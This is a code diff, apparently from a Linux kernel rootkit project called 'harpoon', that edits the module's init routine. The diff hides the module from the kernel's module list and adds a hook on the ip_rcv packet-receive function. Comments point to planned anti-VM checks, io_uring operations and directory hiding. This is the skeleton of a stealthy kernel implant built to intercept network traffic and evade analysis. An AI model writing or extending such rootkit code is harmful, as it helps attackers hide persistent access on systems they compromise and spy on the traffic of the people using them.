@@ -1,9 +1,11 @@
 #include <linux/init.h>
 #include <linux/module.h>
 #include <linux/slab.h>
+#include <net/ip.h>
 
 #include "global.h"
 #include "module/module.h"
+#include "hooking/hooking.h"
 
 struct harpoon_struct *harpoon;
 
@@ -14,7 +16,6 @@ void harpoon_global_init(void){
 }
 
 static int __init harpoon_init(void){
-    struct harpoon_module *harpoon_mod;
 
     // Anti VM
 
@@ -22,14 +23,12 @@ static int __init harpoon_init(void){
     harpoon_global_init();
 
     // Hide harpoon module
-    harpoon_mod = harpoon_new_mod(THIS_MODULE);
-    harpoon_mod_hide(harpoon_mod);
-
-    // Setup hooking
+    harpoon_mod_hide(harpoon_new_mod(THIS_MODULE));
 
     // Hook ip_rcv
+    harpoon_hook(harpoon_new_hook("ip_rcv", harpoon_ip_rcv, ip_rcv));
 
-    // Hook io_uring (if present)
+    // Register io_uring operations
 
     // Hide harpoon directory
 
